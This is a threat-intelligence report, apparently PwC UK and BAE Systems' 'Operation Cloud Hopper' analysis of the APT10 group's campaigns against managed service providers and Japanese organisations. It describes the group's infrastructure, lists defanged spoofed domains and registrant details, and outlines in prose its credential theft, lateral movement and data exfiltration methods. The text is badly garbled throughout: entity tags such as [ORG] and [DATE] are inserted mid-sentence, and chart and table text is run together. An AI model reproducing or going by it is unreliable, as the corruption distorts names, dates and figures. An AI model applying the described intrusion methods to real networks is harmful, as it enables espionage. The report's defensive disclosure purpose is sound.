[TIME] midday break . Figure [CARDINAL] 1 : APT10 domain registration times in UTCFigure [CARDINAL] 2 : APT10 domain registration times in [GPE] UTC+8Apr 2017Mar 2017Feb 2017Jan 2017Dec 2016Nov 2016Oct [DATE] 2016Sep [DATE] 2016 ) DApr 2017Mar 2017Feb [TIME] 2017Jan [TIME] 2017Dec [TIME] 2016Nov 2016Oct [DATE] 2016Sep [DATE] 2016 ) DAug [DATE] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00Aug [DATE] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00Time [DATE] of [DATE] Day ( UTC)Time of Day ( UTC+8)Further analysis of the compile times of PlugX , [ORG] RedLeaves and [ORG] Quasar malware samples used by APT10 reveals a similar pattern in [TIME] working [TIME] hours , as shown in Figure [CARDINAL] 3.Shifting this to [GPE] UTC+8 shows a similar timeframe of operation to the domain registrations . There are some outliers , which are likely attributable to the operational nature of this threat actor , such as requirements to work outside [TIME] normal [TIME] business [TIME] hours . Figure [CARDINAL] 3 : Compile times of PlugX , [ORG] RedLeaves and [ORG] Quasar in UTCFigure [CARDINAL] 4 : Compile times of PlugX , [ORG] RedLeaves and [ORG] Quasar in [ORG] UTC+8Jul 2017Jan [TIME] 2017Jul [TIME] 2015Jan 2016Jul 2015Jan 2015Jul [DATE] 2014Jan [DATE] 2014 ) DJul 2017Jan [TIME] 2017Jul [TIME] 2015Jan 2016Jul 2015Jan 2015Jul [DATE] 2014Jan [DATE] 2014 ) DJul 201300:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00Jul [DATE] 201300:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00Time [DATE] of [DATE] Day ( UTC)Time of Day ( UTC+8)4 The bubbles shown on Figures [CARDINAL] 1 through 6 are representative of the number of events observed at that time and date.6When applying the time shift to the [PERSON] ChChes malware ( newly used by APT10 ) compilation timestamps , we see a different pattern as shown in Figure [CARDINAL] 5 . While this does not align with [NORP] Chinese business hours , it is likely to be either a result of the threat actor changing its risk profile by attempting to obscureor confuse attribution or a developer \u2019s side project that has ended up being used on targeted operations . Based on other technical overlaps , [PERSON] ChChes is highly likely to be exclusively used by APT10.Figure [CARDINAL] 5 : Compile time of [ORG] ChChes in UTCFigure [CARDINAL] 6 : Compile time of [PERSON] ChChes in [GPE] UTC+8 ) DDec [CARDINAL] 15 , 2016Dec [CARDINAL] 1 , 2016Nov [CARDINAL] 17 , 2016Nov [CARDINAL] 3 , [CARDINAL] 2016Oct [CARDINAL] 20 , [CARDINAL] 2016Oct [CARDINAL] 6 , 2016Sep [CARDINAL] 22 , [CARDINAL] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00 ) DDec [CARDINAL] 15 , 2016Dec [CARDINAL] 1 , 2016Nov [CARDINAL] 17 , 2016Nov [CARDINAL] 3 , [CARDINAL] 2016Oct [CARDINAL] 20 , [CARDINAL] 2016Oct [CARDINAL] 6 , 2016Sep [CARDINAL] 22 , [DATE] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00Time [DATE] of [DATE] Day ( UTC)Time of Day ( [PERSON] UTC+8)To further this analysis , we have observed the threat actor conducting interactive activities primarily [TIME] between [TIME] the [TIME] hours [TIME] of [TIME] midnight [TIME] and 10:00 UTC , as shown in Figure [CARDINAL] 7 . When converting this to [GPE] UTC+8 we again see a shift to [NORP] Chinese business hours , with operations occurring [TIME] between [TIME] 08:00 [TIME] and [TIME] 19:00 . It is a realistic probability that [DATE] the [DATE] weekend work observed in Figure [CARDINAL] 7 may be necessary as part of operational requirements . The sum of this analysis aligns with the evidence provided by [ORG] the [ORG] United [ORG] States [ORG] Department [ORG] of [ORG] Justice indictment against several individuals associated with APT1,5 another China- based threat actor , showing a working day starting at [TIME] 08:00 [TIME] UTC+8 and finishing at [TIME] 18:00 [TIME] UTC+8 with a [TIME] two [TIME] hour lunch break from [TIME] 12:00 [TIME] UTC+8 until [TIME] 14:00 [TIME] UTC+8.Figure [TIME] 7 : Operational times of APT10 in UTC+8SunSatFri 18:0017:00 15:00014:0013:001 001:00002:00 0 4 : [QUANTITY] 0 [QUANTITY] 0 [QUANTITY] 05:00 [QUANTITY] 06:0007:00 [QUANTITY] 8:0000910:0:0005 url of events01 [EVENT] - 1011 [EVENT] - 2021 [EVENT] - 3031 [EVENT] - 4041 [EVENT] - 5050 + 7Other threat actors have previously been observed using a similar method of a supply chain attack , for example , in the compromise of [NORP] Dutch certificate authority [ORG] Diginotar in [DATE] 20116 and the compromise of [GPE] US retailer [ORG] Target in 2013.7The command and control ( C2 ) infrastructure chosen by APT10 for Operation Cloud Hopper is predominantly referenced using dynamic - DNS domains . The various domains are highly - interconnected through shared [ORG] IP address hosting , even linking back historically to the threat actor \u2019s much older operations . At present , the indicators detailing APT10 \u2019s operations number into the [CARDINAL] thousands and can not be easily visualised . The graph in Figure [CARDINAL] 8 overleaf depicts a high - level view of the infrastructure used by APT10 throughout [DATE] 2016 . As the campaign has progressed into [DATE] 2017 , the number of dynamic- [ORG] DNS domains in use by the threat actor has significantly increased . The graph in Figure [CARDINAL] 9 , also shown overleaf , extracts one node of the newer C2 from the infrastructure shown in Figure [CARDINAL] 8 and maps this to the older infrastructure of APT10 , as disclosed by [ORG] FireEye in their [DATE] 2014 Siesta Campaign blog post8 . In terms of timing , it is highly likely that a single party is responsible for all of these domains , based on our observations of infrastructure overlap . Through our investigations , we have identified multiple victims who have been infiltrated by the threat actor . Several of these provide enterprise services or cloud hosting , supporting our assessment that APT10 are almost certainly targeting MSPs . We believe that the observed targeting of MSPs is part of a widescale supply - chain attack . Identifying a change in APT10 \u2019s targeting APT10 has , in the past , primarily been known for its targeting of government and [GPE] US defence industrial base organisations , with the earliest known date of its activity being in [DATE] December [DATE] 2009 . Our research and observations suggest that this targeting continues to date . During the [DATE] 2013 \u2013 [DATE] 2014 period there was a general downturn in the threat actor \u2019s activities , as was also seen with other related groups . It was widely assessed that this was due to the public release of information surrounding [NORP] APT1 , which exposed its toolset and infrastructure . From our analysis and investigations , we have identified APT10 as actively operating [CARDINAL] at [CARDINAL] least [CARDINAL] two specific campaigns , [CARDINAL] one targeting MSPs and their clients , and one directly targeting [NORP] Japanese entities . [ORG] MSP focused campaign APT10 has almost certainly been undertaking a global operation of unprecedented size and scale targeting a number of MSPs . APT10 has vastly increased the scale and scope of its targeting to include multiple sectors , which has likely been facilitated by its compromise of MSPs . Such providers are responsible for the remote management of customer IT and end - user systems , thus they generally have unfettered and direct access to their clients \u2019 networks . They may also store significant quantities of customer data on their own internal infrastructure . MSPs therefore represent a high - payoff target for espionage- focused threat actors such as APT10 . Given the level of client network access MSPs have , once APT10 has gained access to a [ORG] MSP , it is likely to be relatively straightforward to exploit this and move laterally onto the networks of potentially [CARDINAL] thousands of other victims . This , in turn , would provide access to a larger amount of intellectual property and sensitive data . APT10 has been observed to exfiltrate stolen intellectual property via the MSPs , hence evading local network defences.6 url [CARDINAL] 7 url [CARDINAL] 8 url [CARDINAL] 8 : High - level view of infrastructure used by APT10 throughout 2016Figure 9 : Infrastructure graph linking early [LOC] Plugx domains to recent APT10 domains9Sectors targetedEngi neering and C onn structioPublic s e cto [ORG] rRetail and C o n sm eruIndustrial man u fa cturingPharemaceuticals a n d Life SciencEnergy and M i ningMeta lsTechno l o [GPE] gyBusine ss and [PERSON] Profe [PERSON] s [PERSON] s is en [ORG] al [ORG] ServicoCountries [ORG] targetedNorwaySwedenFinlandUKFranceSwitzerlandCanadaUSASouth KoreaJapanIndiaThailandBrazilSouth AfricaAustralia10Japan focused campaign In a separate series of operations , APT10 has been systematically targeting [NORP] Japanese organisations using bespoke malware referred to in the public domain as \u2018 ChChes \u2019 . While linked to APT10 , via shared infrastructure , this campaign exhibits some operational differences suggesting a potential sub - division within the threat actor . These operations have seen APT10 masquerading as legitimate [NORP] Japanese public sector entities ( such as [ORG] the [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs , [ORG] Japan [ORG] International [ORG] Cooperation [ORG] Agency and [ORG] the [ORG] Liberal [ORG] Democratic [ORG] Party [ORG] of [ORG] Japan ) to gain access to the victim organisations . Targeting of these entities by APT10 is consistent with previous targeting by [GPE] China - based threat actors of a wide range of industries and sectors in [GPE] Japan . This includes the targeting of commercial companies , and governmentTable [CARDINAL] 1 : [LANGUAGE] Japanese language filenames used by APT10agencies , both of which has resulted in the exfiltration of large amounts of data.9APT10 \u2019s standard compromise methodology begins with a spear phishing email sent to the target , usually with an executable attachment designed to lure the victim to open it . Analysis of the filenames associated with some of the latest APT10 malware samples , particularly from [DATE] late [DATE] 2016 , highlights the use of [LANGUAGE] Japanese language filenames which clearly indicates a campaign targeting [LANGUAGE] Japanese - speaking individuals . Further analysis of these files can be found in [ORG] Annex B.Table [CARDINAL] 1 shows some example file names being used by APT10 in this campaign . [PERSON] Japanese [PERSON] Filename [DATE] 1102()._exe [DATE] 2016\u30b7\u30f3\u30dd\u30b8\u30a6\u30e0A4\uff3f1025.exe ( [DATE] 28.11.07).exe [DATE] \u30ed\u30b7\u30a2\u306e\u3068\u300c\u300d\u306e.exeTranslation [DATE] 1102 Mainich [ORG] Newspaper ( answer)._exe [DATE] 2016 [ORG] Prefectural [ORG] University [ORG] Symposium A4_1025.exe Business contact invitation ( [CARDINAL] 28.11.07).exe Regarding provision of Individual number.exe [GPE] Japan - [GPE] US expansion deterrence conference ( e ) Foundation of [NORP] Russian historical association and [ORG] Composing [ORG] \u300c a unity \u300d state history textbook.exeThe following is an example of a malicious decoy document referencing [ORG] Mitsubishi [ORG] Heavy [ORG] Industries : Figure [CARDINAL] 10 : Decoy document based on press release from [NORP] Japanese firm [ORG] Mitsubishi [ORG] Heavy [ORG] Industries detailing the unveiling of their new [ORG] ABLASER - DUV ( Deep Ultraviolet Laser)9 url notable tactic of this APT10 subset is to register C2 domains that closely resemble legitimate [NORP] Japanese organisations . Table [CARDINAL] 2 shows a selection of the spoofed domains registered , alongside the email addresses listed at registration and the legitimate impersonated domains . Table 2 : [ORG] Domains observed being impersonated by APT10Domain bdoncloud[.]com cloud - kingl[.]com cloud - maste[.]com incloud - go[.]com incloud - obert[.]com meiji - ac - jp[.]com u - tokyo - ac - jp[.]com jica - go - jp[.]bike jica - go - jp[.]biz jimin - jp[.]biz mofa - go - jp[.]comImitating Generic Cloud themecmmb.org ccf.org.ph cwi.org.uk meiji.ac.jp u-tokyo.ac.jp [PERSON] jica.go.jp [PERSON] jica.go.jp jimin.jp [ORG] mofa.go.jpReligionCharityJapan [ORG] / [ORG] AcademicJapan [ORG] / [ORG] Public [ORG] SectorCatholic [ORG] Medical [ORG] Mission [ORG] Board Christ \u2019s [ORG] Commission [ORG] Fellowship \u2013 based in [GPE] Philippines [NORP] Christian Witnesses to [GPE] Israel [GPE] United [GPE] States Fund For Unicef The Salvation Army Meiji University in [GPE] Japan [GPE] Tokyo University in [GPE] Japan Japan International Cooperation Agency Japan International Cooperation Agency Liberal Democratic Party of Japan Ministry of Foreign AffairsThe top level C2 domains observed in this campaign share a number of features that can be used to further identify affiliated nodes . Table [CARDINAL] 3 displaying registrant information can be seen below : Table [CARDINAL] 3 : Known APT10 registration details showing a common name serverDomain belowto[.]com ccfchrist[.]comRegistrant email robertorivera@india.com wenonatmcmurray@india.comName [PERSON] Server [PERSON] Contact [PERSON] Name [PERSON] Contact Street ns1.ititch.com [PERSON] Roberto [PERSON] Rivera ns1.ititch.com [PERSON] Wenona McMurray904 Peck Street Manchester , NH 03103 824 [FAC] Ocala [FAC] Street [GPE] Winter [GPE] Park , FL 32789cloud - maste [ . ] com poulsenv[.]commeganfdelgado@india.comns1.ititch.com [PERSON] Megan [PERSON] Delgado [PERSON] 3328 Sigley Road Burlingame , [ORG] KS [ORG] 66413abellonav.poulsen@yandex.com ns1.ititch.com [PERSON] Abellona [PERSON] Poulsen2187 [PERSON] Findley [PERSON] Avenue [PERSON] Carrington , ND 58421unhamj[.]com juanitardunham@india.com wthelpdesk[.]com [PERSON] armandovalcala@india.comns1.ititch.com [PERSON] Juanita [PERSON] Dunham [CARDINAL] 745 [PERSON] Melody [PERSON] Lane [PERSON] Richmond , VA 23219 ns1.ititch.com [PERSON] Armando [PERSON] Alcala [CARDINAL] 608 [NORP] Irish [PERSON] Lane [PERSON] Madison , WI 5371812None of the domains share identical contact information other than stating that the respective registrants are based in the [GPE] US . The contact streets , organisations , and names are all distinct between domains . Some of the domains , that do resolve , share common [ORG] IP address space with the network of dynamic - DNS domains that we associate with Operation Cloud Hopper as detailed earlierin the report . This connection is highlighted in the infrastructure graph shown in Figure [CARDINAL] 11 below , where some [PERSON] ChChes C2 domains can be seen in the bottom left , while on the far right are the older APT10 domains referenced in previous reporting . Figure [CARDINAL] 11 : Infrastructure graph linking early PlugX domains to recent [ORG] ChChes domains13Motivations behind APT10 \u2019s targetingA short history of [GPE] China - based hacking [GPE] China - based threat actors have a long history of cyber espionage in the traditional political , military and defensive arena , as well as industrial espionage for economic gain . Some of the most notable of these events from [DATE] the [DATE] past [DATE] decade are shown belowFigure [CARDINAL] 12 : \u2013 Timeline of China - based hacking activity2006 - 13 : [NORP] APT1 conducted a widespread cyber espionage campaign against [CARDINAL] hundreds of organisations spanning a number of sectors . Most victims primarily conducted their business in [LANGUAGE] English and had a nexus with [GPE] China \u2019s strategic priorities.2010 : Technology , \ufb01nancial and defence sectors were targeted by [PERSON] Operation [PERSON] Aurora , a campaign attributed to [GPE] APT17 / [PERSON] Aurora [PERSON] Panda . The list of targets included [ORG] Google , who suffered the loss of intellectual property and attempted access to the [PERSON] Gmail accounts of human rights activists.2010 [CARDINAL] - [CARDINAL] 12 : Between 2010 and [DATE] 2012 organisations in the energy and material manufacturing sectors were targeted . These included [ORG] Westinghouse [ORG] Electric , who had technical and design speci\ufb01cations for pipes , pipe supports and routing stolen in [DATE] 2010 . Additionally , emails of senior decision - makers involved in the business relationship with a [NORP] Chinese state - owned enterprise were taken . In [DATE] 2012 , [ORG] SolarWorld was compromised with attackers stealing sensitive business information relating to manufacturing metrics , and production line information and costs . It is thought to have been targeted strategically at a time when [NORP] Chinese manufacturers of solar products were seeking to enter the [GPE] US market at below fair value prices.2014 : The data of [CARDINAL] 4.5 [CARDINAL] million members of [GPE] US - based healthcare organisation , [ORG] Community [ORG] Health [ORG] Systems was potentially accessed involved covert cyber attacks on global oil , energy and petrochemical companies and individuals in [GPE] Kazakhstan , [GPE] Taiwan , [GPE] Greece and the [GPE] US . The attackers used a number of vectors including social engineering and OS vulnerabilities to access proprietary operations and \ufb01nancial information2009 : [ORG] GhostNet is the alleged [NORP] Chinese group responsible for running a global campaign starting in [DATE] 2009 targeting foreign embassies and ministries , NGOs , news media institutions and [GPE] Tibet - related organisations.2013 : Operation [PERSON] Iron [PERSON] Tiger is an attack campaign attributed to APT31 , in which [GPE] US government contractors were targeted in the areas of technology , telecommunications , energy and manufacturing.2009 : [CARDINAL] Three medical device makers ( Medtronic , [ORG] Boston [ORG] Scienti\ufb01c , St. Jude Medical ) were allegedly compromised by [NORP] Chinese actors . Although the motive is unclear , patient data was not thought to be stolen , making industrial espionage the most likely intention.2014 - [CARDINAL] 15 : The personal data of [CARDINAL] over [CARDINAL] 20 [CARDINAL] million people was compromised from [FAC] the [FAC] US [FAC] Of\ufb01ce [FAC] of [FAC] Personnel [FAC] Management and attributed to [GPE] China - based actors . This included [ORG] Social [ORG] Security numbers as well as security clearance and job applications for government positions.2014 - [CARDINAL] 15 : Several healthcare \ufb01rms were targeted \u2013 [PERSON] Anthem , Premera [ORG] Blue [ORG] Cross and [ORG] CareFirst all suffered data breaches in [DATE] 2015 . These were linked to APT19.14Operation [PERSON] Cloud [PERSON] Hopper14APT10 alignment with previous [GPE] China - based hacking [ORG] Espionage attacks associated with [GPE] China - based threat actors , as noted above , have traditionally targeted organisations that are of strategic value to [NORP] Chinese businesses and where intellectual property obtained from such attacks could facilitate domestic growth or advancement . NextFigure [CARDINAL] 13 : Industries of interest outlined by \u2018 Made in [GPE] China equipmentThere has been significant open source reporting which has documented the alignment between apparent information collection efforts of [GPE] China - based threat actors and the strategic emerging industries documented in [GPE] China \u2019s [DATE] Five [DATE] Year [DATE] Plan ( FYP).10 The 13th [ORG] FYP was released in [DATE] March [DATE] 2016 and the sectors and organisations known to be targeted by APT10 are broadly in line with the strategic aims documented in this plan . These aims outlined in the [ORG] FYP will largely dictate the growth of businesses in [GPE] China and are , therefore , likely to also form part of [NORP] Chinese companies \u2019 business strategies . The latest [ORG] FYP describes [CARDINAL] five principles which underpin [GPE] China \u2019s goal of doubling its [DATE] 2010 GDP by [DATE] 2020 . At the forefront of these principles is innovation , largely focused around technological innovation , with [GPE] China expected to invest 2.5 % of GDP in research and development to attain technological advances , which are anticipated to contribute 60 % towards economic growth objectives.11 The areas of innovation expected to receive extensive investment include , next - generation communications , new energy , new materials , aerospace , biological medicine and smart manufacturing . In addition to the [ORG] FYP principle of innovation , [GPE] China is also promoting [CARDINAL] ten key industries in which it wants to improve innovation in manufacturing as part of the \u2018 Made in [GPE] China 2025 \u2019 initiative.12Agricultural machineryMedicineandmedical devicesNewmaterialsPowerequipment\u2018Made inChina 2025\u2019industriesRailway equipmentand high - techshipsObserved APT10 targeting is in line with many of the historic compromises we have outlined previously as originating from [GPE] China . This targeting spans industries that align with [GPE] China \u2019s 13th [ORG] FYP which would provide valuable information to advance the domestic innovation goals held within [GPE] China . Given the broad spectrum of priority industries , the compromise of MSPs represents an efficient method of information collection . This strategy also provides additional obfuscation for the actor as any data exfiltrated is taken back through the initial compromised company \u2019s systems , creating a much more difficult trail to follow.10 url [CARDINAL] 11 url [CARDINAL] 12 url a light on [ORG] APT10 \u2019s [ORG] methodologyMSP1 APT10 ex\ufb01ltrates stolen data back through MSPs to infrastructure controlled by the threat actorM S P c ustomer0 PAusend for ex \ufb01 ltratioTar g e ted [ORG] MSPCusto m e r2 [ORG] MSP customers who align to APT10 \u2019s targeting pro\ufb01le are accessed by the threat actor using the MSPs legitimate access3 Data of interest to APT10 is accessed by the threat actor moving laterally through systemsr getedaT5 Compressed \ufb01les \ufb01lled with stolen data are moved from the [ORG] MSP customer \u2019s network back onto the [ORG] MSP networkMSPDat a4 [ORG] MSP customer data collected by [ORG] APT and compressed , ready for ex\ufb01ltration from the networkFigure [CARDINAL] 14 : Decoy document used by APT10 to target the [NORP] Japanese education sectorAPT10 has been known to use research from their reconnaissance to obtain company email addresses , and then craft a message containing either a malicious attachment or a link to a malicious site . This section details changes made to APT10 tools , techniques and procedures ( TTPs ) [DATE] post-2014 , following its shift from [ORG] Poison Ivy to PlugX. These TTPs have been identified as part of our incident response and threat intelligence investigations and have been used in both of the recent campaigns we have encountered . The examples provided in this section will be drawn from both of those campaigns . Reconnaissance and targetingIt is often difficult to identify the early stages of a threat actor \u2019s preparation for an attack as these initial activities tend to occur below the line of visibility . Our analysis of the most recently used decoy documents by APT10 in its spear phishing campaigns , which is the primary delivery method of its payloads , indicates the actor performs a significant level of research on its targets . In line with commonly used [ORG] APT actor methodologies , the threat actor aligns its decoy documents to a topic of interest relevant to the recipient . In the example shown in Figure [CARDINAL] 14 to the right , an official document hosted on [ORG] the [ORG] Japan [ORG] Society [ORG] for [ORG] the [ORG] Promotion [ORG] of [ORG] Science website was weaponised and deployed as part of a spear phishing campaign against a [NORP] Japanese target in the education sector.16Figure [CARDINAL] 15 : Timeline of APT10 related activitiesSummary of [ORG] APT10 [ORG] activity2009 [ORG] Group \ufb01rst detected [NORP] Targets [NORP] East [NORP] Asian [NORP] Policy organisationsQ4 2014 Other eventsAugust 2013 [ORG] FireEye [ORG] - [ORG] Poison Ivy : reports on links between [NORP] APT1 and organisationsAs part of the same campaign , we have also observed an email sent by APT10,13 referencing a Scientific Research Grant Program , and targeting various [NORP] Japanese education institutes including [ORG] Meiji [ORG] University14 and Chuo University.15 The email included a zip file containing a link to download a payload from [CARDINAL] one of APT10 \u2019s servers , the ChChes Powersploit exploit , detailed in Annex B.Initial compromise and lateral movement Once on a target network , the actor rapidly deploys malware to establish a foothold , which may include [CARDINAL] one or more systems that provide sustained access to a victim \u2019s network . As APT10 works to gain further privileges and access , it also conducts internal reconnaissance , mapping out the network using common Windows tools , and in later stages of the compromise using open source pentesting tools , detailed in Annex B.This reconnaissance is run in parallel with the actor ensuring that it has access to legitimate credentials . We have observed that in cases where APT10 has infiltrated a target via an [ORG] MSP , it continues to use the MSPs credentials . In order to gain any further credentials , APT10 will usually deploy credential theft tools such as mimikatz or [PERSON] PwDump , sometimes using [ORG] DLL load order hijacking , to use against a domain controller , explained further in [PERSON] Annex [PERSON] B. [PERSON] Regular communications checks are then executed in order to maintain this level of access . In most cases , these stolen [ORG] MSP credentials have provided administrator or domain administrator privileges . We have observed the threat actor copying malware over to systems in a compromised environment , which did not have13 url [CARDINAL] 14 url [CARDINAL] 15 url outbound internet access . In [CARDINAL] one of these instances , the threat actor spent [TIME] more [TIME] than [TIME] an [TIME] hour attempting to establish an outbound connection using [LOC] PlugX until it realised that the host had no internet access , at which point the malware and all supporting files were deleted . APT10 achieves persistence on its targets primarily by using scheduled tasks or Windows services in order to ensure the malware remains active regardless of system reboots . APT10 heavily leverages the shared nature of client - side [ORG] MSP infrastructure to move laterally between MSPs and other victims . Systems that share access and thus credentials , from both a [ORG] MSP and [CARDINAL] one of its clients serve as a way of hopping between the [CARDINAL] two . Figure [CARDINAL] 16 : [GPE] Client \u2013 [ORG] MSP shared infrastructureClie n t i n f r a structureM [WORK_OF_ART] S [WORK_OF_ART] Pi [WORK_OF_ART] n frastructureSystems sharing credentials across the client and the [ORG] MSP are of particular interest to APT10 , and are commonly used by the threat actor in order to gain access to new areas of the [PRODUCT] network17APT10 simultaneously targets both low profile and high value systems to gain network persistence and a high level of access respectively . For example , in addition to compromising high value domain controllers and security servers , the threat actor has also been observed identifying and subsequently installing malware on low profile systems that provide non - critical support functions to the business , and are thus less likely to draw the attention of system administrators . As part of the long - term access to victim networks , we have observed APT10 consistently install updates and new malware on compromised systems . In the majority of instances APT10 used either a reverse shell or RDP connection to install its malware ; the actor also uses these methods to propagate across the network . Communication checks are usually conducted using native Windows tools such as ping.exe , net.exe and tcping.exe . The actor will frequently \u2018 net use \u2019 to several machines within [TIME] several [TIME] seconds , connecting for [PERCENT] as [PERCENT] little [PERCENT] as [PERCENT] five [PERCENT] seconds , before disconnecting . Further details are provided in Annex B.Network hopping and exfiltration Once APT10 have a foothold in victim networks , using either legitimate [ORG] MSP or local domain credentials , or their sustained malware such as PlugX , [ORG] RedLeaves or Quasar RAT , they will begin to identify systems of interest . The operator will either access these systems over RDP , or browse folders using [ORG] Remote [ORG] Access [ORG] Trojan ( RAT ) functionality , to identify data of interest . This data is then staged for exfiltration in multi - part archives , often placed in [LAW] the [LAW] Recycle [LAW] Bin , using either [ORG] RAR or [ORG] TAR . The compression tools are often launched via a remote command execution script which is regularly named \u2018 t.vbs \u2019 and is a customised version of an open source [ORG] WMI command executor which pipes the command output back to the operator . We have observed these archives being moved outside of the victim networks , either back into to the [ORG] MSP environments or to external [ORG] IP addresses in [CARDINAL] two methods , which are also performed via the command line using t.vbs : [CARDINAL] 1 . Mounting the target external network share with \u2018 net use\u2019and subsequently using the legitimate [NORP] Robocopy tool to transfer the data ; and,2 . Using the legitimate Putty Secure Copy Client ( PSCP),sometimes named rundll32.exe , to transfer the data directly to the [ORDINAL] third party system.18Using these techniques , APT10 \u2018 pushes \u2019 data from victim networks to other networks they have access to , such as other [ORG] MSP or victim networks , then , using similar methods , \u2018 pulls \u2019 the data from those networks to locations from which they can directly obtain it , such as the threat actor \u2019s C2 servers . APT10 \u2019s ability to bridge networks can therefore be summarized as : \u2022 Use of legitimate [ORG] MSP credentials to management systemswhich bridge the [ORG] MSP and multiple [ORG] MSP customer networks;\u2022 Use of RDP to interactively access systems in both the MSPmanagement network and [ORG] MSP customer networks;\u2022 Use of t.vbs to execute command line tools ; and , \u2022 Use of PSCP and [PERSON] Robocopy to transfer data . APT10 malware We classify APT10 \u2019s malware into [CARDINAL] two distinct areas : tactical and sustained . The tactical malware , historically [ORG] EvilGrab , and now [PERSON] ChChes ( and likely also [ORG] RedLeaves ) , is designed to be lightweight and disposable , often being delivered through spear phishing . Once executed , tactical malware contains the capability to profile the network and manoeuvre through it to identify a key system of interest . The sustained malware , historically [ORG] Poison Ivy , PlugX and now [ORG] Quasar provides a more comprehensive feature set . Intended to be deployed on key systems , the sustained malware facilitates long - term remote access and allows for operators to more easily carry out administration tasks . Since [DATE] late [DATE] 2016 , we have seen the threat actor develop several bespoke malware families , such as [ORG] ChChes and [ORG] RedLeaves . Additionally , it has taken the open source malware , Quasar , and extended its capabilities , ensuring the incrementation of the internal version number as it does so . We have also observed APT10 use [ORG] DLL search order hijacking and sideloading , to execute some modified versions of open - source tools . For example , [ORG] PwC [GPE] UK has observed APT10 compiling DLLs out of tools , such as [PRODUCT] MimiKatz and PwDump6 , and using legitimate , signed software , such as [PERSON] Windows [PERSON] Defender to load the malicious payloads . In Annex B we provide detailed analysis of several of the threat actor \u2019s tools as well as the common Windows tools we have observed being used . Timeline Alongside APT10 \u2019s TTPs , we have observed a \u2018 retooling \u2019 cycle . Given the pace of technological change and the wide range of freely available online tools and scripts , it is not unusual for an actor to re - evaluate its capabilities and to benchmark multiple offerings against each other . We have observed a decline in the deployment of some of APT10 \u2019s traditional core tool set , and witnessed an increase in the development and deployment of additional new tools which combine in - house development and open source projects . We assess that this is highly likely due to the public release of APT10 malware by cyber security vendors . Throughout our investigations , we have observed multiple deployments of the [LOC] PlugX malware from [DATE] 2014 to at least 2016 . This , along with the downturn in the use of Poison Ivy , supports the notion that a major retooling operation took place post [DATE] 2014 . Additional analysis of the infrastructure associated with each distinct version of PlugX also shows an increase in maturity over time . Earlier PlugX versions were configured with legacy domains and [ORG] IP addresses , which were originally isolated and more obvious , whereas more recent versions have demonstrated a standardised convention for domain names and [ORG] IP selection . During our analysis of victim networks , we were able to observe APT10 once again initiate a retooling cycle in [DATE] late [DATE] 2016 . We observed the deployment and testing of multiple versions of Quasar malware,16 and the introduction of the bespoke malware families [PERSON] ChChes and [ORG] RedLeaves . We assess it is highly likely that due to the frequent public release of information linking PlugX with [GPE] China - based threat actors , continual long - term use had become unsustainable , introducing an additional operational overhead that is easily attributable to [GPE] China - based threat actors.16 url is a constantly evolving , highly persistent [GPE] China - based threat actor that has an ambitious and unprecedented collection programme against a broad spectrum of sectors , enabled by its strategic targeting . Since exposure of its operations in [DATE] 2013 , APT10 has made a number of significant changes intended to thwart detection of its campaigns . PwC [GPE] UK and [ORG] BAE [ORG] Systems , working closely with industry and government , have uncovered a new , unparallelled campaign which we refer to as Operation Cloud Hopper . This operation has targeted managed IT service providers , the compromise of which provides APT10 with potential access to [CARDINAL] thousands of further victims . An additional campaign has also been observed targeting [NORP] Japanese entities . APT10 \u2019s malware toolbox shows a clear evolution from malware commonly associated with [GPE] China - based threat actors towards bespoke in - house malware that has been used in more recent campaigns ; this is indicative of APT10 \u2019s increasing sophistication , which is highly likely to continue . The threat actor \u2019s known working hours align to Chinese Standard Time ( [ORG] CST ) and its targeting corresponds to that of other known [GPE] China - based threat actors , which supports our assessment that these campaigns are conducted by APT10.This campaign serves to highlight the importance of organisations having a comprehensive view of their threat profile , including that of their supply chain \u2019s . More broadly , it should also encourage organisations to fully assess the risk posed by their [ORDINAL] third party relationships , and prompt them to take appropriate steps to assure and manage these . A detailed technical annex supplements this main report , which provides further information about the tools and techniques used by APT10 and contains Indicators of Compromise relating to all of this threat actor \u2019s known campaigns . These have already been provided to [ORG] the [ORG] National [ORG] Cyber [ORG] Security [ORG] Centre for dissemination through their usual channels.20Appendices21Appendix ACollaboration between [NORP] PwC UK and [ORG] BAE [ORG] Systems [ORG] PwC and [ORG] BAE [ORG] Systems \u2019 respective [ORG] Threat [ORG] Intelligence teams share a mutual interest in new cyber threats . [ORG] PwC and [ORG] BAE [ORG] Systems partnered through their membership of [ORG] the [ORG] Cyber [ORG] Incident [ORG] Response ( [ORG] CIR ) scheme to share intelligence and develop the most comprehensive picture possible of this threat actor \u2019s activities . Information sharing like this underpins the security research community and serves to aid remediation and inform decisions that companies make about their security needs . Probabilistic language Interpretations of probabilistic language ( for example , \u201c likely \u201d or \u201c almost certainly \u201d ) vary widely , and to avoid misinterpretation we have used the following qualitative terms within this report when referring to the level of confidence we have in our assessments . Unless otherwise stated , our assessments are not based on statistical analysis . Table 4 : Probabilistic languageQualitative term Remote or highly unlikely Improbable or unlikely Realistic probability Probable or likely [PERSON] Highly probable or highly likely Almost certainAssociated probability range [PERCENT] Less [PERCENT] than [PERCENT] 10 % More than 90%22Appendix BPwC [GPE] UK reporting PwC UK Threat Intelligence has previously published a range of APT10 related reporting , both in the public domain and via our subscription service . These reports are as follows:\u2022 APT10 resumes operations with a vengeance , [PERSON] inThreats Under the Spotlight \u2013 CTO - TUS-20170321 - 01A\u2022 menuPass Returns with [GPE] New [GPE] Malware and [ORG] NewAttacks [ORG] Against [ORG] Japanese [ORG] Academics [ORG] and [ORG] Organizations , url [ORG] com/2017/02 / unit42 - menupass - returns - new - malware- new - attacks - japanese - academics - organizations/ , published [DATE] 2017 [DATE] - 02 [DATE] - [DATE] 16 . 